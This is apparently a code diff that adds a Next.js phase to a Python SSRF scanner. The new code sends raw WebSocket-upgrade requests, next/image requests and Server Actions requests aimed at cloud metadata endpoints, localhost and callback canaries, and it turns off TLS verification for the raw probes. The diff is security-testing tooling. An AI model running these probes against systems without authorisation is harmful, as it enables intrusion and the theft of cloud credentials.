@@ -4,6 +4,7 @@ import asyncio
 import base64
 import logging
 import os
+import ssl
 import threading
 import time
 from datetime import datetime, timedelta
@@ -197,7 +198,7 @@ class SSRFScanner:
             self.logger.error(f"Error loading blind payload library: {str(e)}")
             self.blind_lib = None
 
-    async def make_request(self, url, method='GET', headers=None, timeout=None):
+    async def make_request(self, url, method='GET', headers=None, timeout=None, data=None):
         """Async request method with rate limiting and error handling"""
         try:
             default_headers = {
@@ -227,6 +228,10 @@ class SSRFScanner:
                 'ssl': False if not self.config.scanner['verify_ssl'] else None,
                 'allow_redirects': self.config.scanner['follow_redirects']
             }
+
+            # Optional request body (e.g. Server Actions POST probes)
+            if data is not None:
+                request_kwargs['data'] = data
             
             # Add proxy if configured
             if self.config.scanner.get('proxy'):
@@ -440,6 +445,11 @@ class SSRFScanner:
         est += h * max(len(self.waf_bypass), 1)              # WAF Bypass (roughly, deduped)
         if self.blind_lib:                                   # Blind SSRF
             est += 16 if not self._has_callback_target() else self.blind_lib.count()
+        # Next.js phase: 4 WS probe paths x2 (malformed+control) + next/image
+        # targets + a couple of callback-gated probes.
+        est += 8 + 4
+        if self._has_callback_target():
+            est += 3
         if self._has_callback_target():                      # Remote
             est += h * 10
         if self._oob_enabled():                              # Redirect (OOB only)
@@ -1160,6 +1170,223 @@ class SSRFScanner:
                 if self.reporter:
                     await self.reporter.add_result_async(result)
 
+    async def _raw_http_probe(self, host, port, use_tls, request_bytes, read_bytes=8192, timeout=None):
+        """Send a raw, hand-built HTTP request over a socket and return the raw
+        response bytes (or None on failure).
+
+        Needed for probes that require control of the request line itself (e.g.
+        the absolute-form request-URI used by the Next.js WebSocket-upgrade
+        SSRF), which aiohttp's normal client path cannot express. Honors the
+        scanner's concurrency semaphore, rate limiter and request accounting so
+        it behaves like any other request in progress/throttling.
+        """
+        timeout = timeout or self.config.scanner['timeout']
+        async with self.semaphore:
+            await self.throttler.pre_request()
+            self.total_requests_attempted += 1
+            reader = writer = None
+            try:
+                ssl_ctx = None
+                if use_tls:
+                    ssl_ctx = ssl.create_default_context()
+                    # Match the client's verify_ssl=False default for scanning.
+                    ssl_ctx.check_hostname = False
+                    ssl_ctx.verify_mode = ssl.CERT_NONE
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(
+                        host, port, ssl=ssl_ctx,
+                        server_hostname=host if use_tls else None,
+                    ),
+                    timeout=timeout,
+                )
+                writer.write(request_bytes)
+                await asyncio.wait_for(writer.drain(), timeout=timeout)
+                data = await asyncio.wait_for(reader.read(read_bytes), timeout=timeout)
+                await self.throttler.post_request(success=True)
+                self.total_requests_succeeded += 1
+                return data
+            except Exception as e:
+                self.total_requests_failed += 1
+                error_type = type(e).__name__
+                self.failure_reasons[error_type] = self.failure_reasons.get(error_type, 0) + 1
+                await self.throttler.post_request(success=False)
+                if self.config.scanner['debug']:
+                    self.logger.error(f"Raw probe failed for {host}:{port}: {error_type}: {str(e)}")
+                return None
+            finally:
+                if writer is not None:
+                    try:
+                        writer.close()
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+
+    def _nextjs_ws_indicator(self, malformed, control):
+        """Decide whether a Next.js WebSocket-upgrade SSRF probe fired.
+
+        ``malformed`` is the response to the absolute-form upgrade request
+        (``GET http:///<path>``); ``control`` is the response to an otherwise
+        identical origin-form request. Detection is deliberately conservative
+        to avoid the false positives the advisory warns about (a fronting
+        nginx/CDN also errors on absolute-form URIs):
+
+          - a concrete content signature (leaked creds / metadata) => definite;
+          - otherwise, an upstream HTTP response proxied back inside the body
+            (a nested ``HTTP/1.`` status line) or an ``Internal Server Error``
+            that the origin-form control did NOT produce => likely.
+        """
+        if not malformed:
+            return None
+
+        for sig in self.SSRF_CONTENT_SIGNATURES:
+            if sig in malformed:
+                return ('signature', sig.decode('utf-8', errors='ignore'))
+
+        def _body(raw):
+            return raw.split(b'\r\n\r\n', 1)[1] if raw and b'\r\n\r\n' in raw else b''
+
+        mal_body = _body(malformed)
+        ctrl_body = _body(control)
+
+        # A proxied upstream response shows up as a second status line inside
+        # the body. The control request (valid origin-form) should not proxy.
+        if b'HTTP/1.' in mal_body and b'HTTP/1.' not in ctrl_body:
+            return ('proxy', 'nested upstream HTTP response in body')
+
+        if b'Internal Server Error' in malformed and (
+                not control or b'Internal Server Error' not in control):
+            return ('proxy', 'Internal Server Error (absolute-form only)')
+
+        return None
+
+    async def nextjsAttack(self, url, original_response):
+        """Next.js-specific SSRF probes.
+
+        Covers three real, distinct Next.js SSRF classes that the generic
+        header/parameter phases cannot reach:
+
+          1. CVE-2026-44578 - WebSocket-upgrade SSRF. A malformed absolute-form
+             upgrade request (``GET http:///<path>`` + ``Upgrade: websocket``)
+             makes the self-hosted Next.js server proxy to localhost/arbitrary
+             hosts. Requires raw request-line control, so it is sent over a raw
+             socket. With OOB active, a second variant points the absolute-form
+             authority at the unique canary for out-of-band confirmation.
+          2. next/image blind SSRF - ``/_next/image?url=<internal>`` fetches an
+             attacker-supplied URL server-side. Requested normally; confirmed by
+             a content signature in-band or by an OOB callback.
+          3. CVE-2024-34351 - Server Actions Host-header SSRF. A POST carrying a
+             ``Next-Action`` header with the ``Host`` set to the canary makes the
+             action fetch from the canary (blind; OOB/--backurl only).
+        """
+        parsed = urlparse(url)
+        host = parsed.hostname or ''
+        if not host:
+            return
+        use_tls = parsed.scheme == 'https'
+        port = parsed.port or (443 if use_tls else 80)
+
+        # --- 1. CVE-2026-44578: WebSocket-upgrade SSRF (raw socket) ----------
+        probe_paths = ['x', 'healthz', 'server-status', 'latest/meta-data/']
+
+        def _ws_request(request_target):
+            return (
+                f"GET {request_target} HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                "Connection: Upgrade\r\n"
+                "Upgrade: websocket\r\n"
+                "Sec-WebSocket-Version: 13\r\n"
+                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+                "\r\n"
+            ).encode('latin-1', errors='ignore')
+
+        for path in probe_paths:
+            # Malformed absolute-form request-URI with empty authority; the
+            # vulnerable resolveRoutes + upgrade handler collapses '//' and
+            # proxies to localhost. Paired with an origin-form control request.
+            malformed = await self._raw_http_probe(host, port, use_tls, _ws_request(f"http:///{path}"))
+            control = await self._raw_http_probe(host, port, use_tls, _ws_request(f"/{path}"))
+            indicator = self._nextjs_ws_indicator(malformed, control)
+            if indicator:
+                kind, detail = indicator
+                result = ScanResult(
+                    url=url,
+                    attack_type='NextJS:WebSocketUpgradeSSRF',
+                    payload=f"GET http:///{path} (Upgrade: websocket) [CVE-2026-44578]",
+                    response_code=0,
+                    response_size=len(malformed or b''),
+                    timestamp=datetime.now(),
+                    headers={},
+                    is_vulnerable=True,
+                    verification_method="Response Content Analysis",
+                    notes=f"CVE-2026-44578 WebSocket-upgrade SSRF ({kind}: {detail})",
+                )
+                self.log_vulnerability(result)
+                if self.reporter:
+                    await self.reporter.add_result_async(result)
+
+        # OOB-confirmed variant: point the absolute-form authority at a unique
+        # canary so an inbound callback proves the server proxied our URL.
+        if self._oob_enabled():
+            cb = self._callback('NextJS:WebSocketUpgradeSSRF', 'CVE-2026-44578', url)
+            await self._raw_http_probe(host, port, use_tls, _ws_request(f"http://{cb}/"))
+
+        # --- 2. next/image blind SSRF ---------------------------------------
+        image_targets = [
+            'http://169.254.169.254/latest/meta-data/',
+            'http://metadata.google.internal/computeMetadata/v1/',
+            'http://127.0.0.1/',
+            'http://[::1]/',
+        ]
+        if self._has_callback_target():
+            cb = self._callback('NextJS:ImageSSRF', 'next/image url=', url)
+            image_targets.append(f"http://{cb}/")
+
+        image_tasks = []
+        image_meta = []
+        base = url.rstrip('/')
+        for target in image_targets:
+            probe_url = f"{base}/_next/image?url={quote(target, safe='')}&w=64&q=75"
+            image_tasks.append(self.make_request(probe_url))
+            image_meta.append((target, probe_url))
+
+        image_responses = await asyncio.gather(*image_tasks, return_exceptions=True)
+        for (target, probe_url), response in zip(image_meta, image_responses):
+            if not response or isinstance(response, Exception):
+                continue
+            signature = self._ssrf_signature(response)
+            if signature:
+                result = ScanResult(
+                    url=probe_url,
+                    attack_type='NextJS:ImageSSRF',
+                    payload=f"/_next/image?url={target}",
+                    response_code=response.status_code,
+                    response_size=len(response.content),
+                    timestamp=datetime.now(),
+                    headers={},
+                    is_vulnerable=True,
+                    verification_method="Response Content Analysis",
+                    notes=f"next/image SSRF content signature: {signature}",
+                )
+                self.log_vulnerability(result)
+                if self.reporter:
+                    await self.reporter.add_result_async(result)
+
+        # --- 3. CVE-2024-34351: Server Actions Host-header SSRF (blind) ------
+        # Blind-only: confirmation requires a callback destination. The Host
+        # header is redirected to the canary so a vulnerable Server Action
+        # fetches from infrastructure we control.
+        if self._has_callback_target():
+            cb = self._callback('NextJS:ServerActionsSSRF', 'CVE-2024-34351', url)
+            action_headers = {
+                'Host': cb,
+                'Next-Action': 'ssrf-probe',
+                'Content-Type': 'text/plain;charset=UTF-8',
+                'Accept': 'text/x-component',
+            }
+            # Best-effort: we don't know a valid action id, so this only fires
+            # against permissive setups; OOB callback is the real signal.
+            await self.make_request(url, method='POST', headers=action_headers, data='[]')
+
     def verify_vulnerability(self, url: str, payload: str, response, original_response=None) -> str:
         """Verify if the potential vulnerability is real"""
         # Pass original_response to verification methods that need it
@@ -1350,6 +1577,12 @@ class SSRFScanner:
                 await self.blindSsrfAttack(url, original_response)
             except Exception as e:
                 self.logger.error(f"Error in Blind SSRF attack: {str(e)}")
+
+            try:
+                self.progress.current_phase = "Next.js"
+                await self.nextjsAttack(url, original_response)
+            except Exception as e:
+                self.logger.error(f"Error in Next.js attack: {str(e)}")
 
             # Redirect-based SSRF only runs with an active OOB listener.
             if self._oob_enabled():
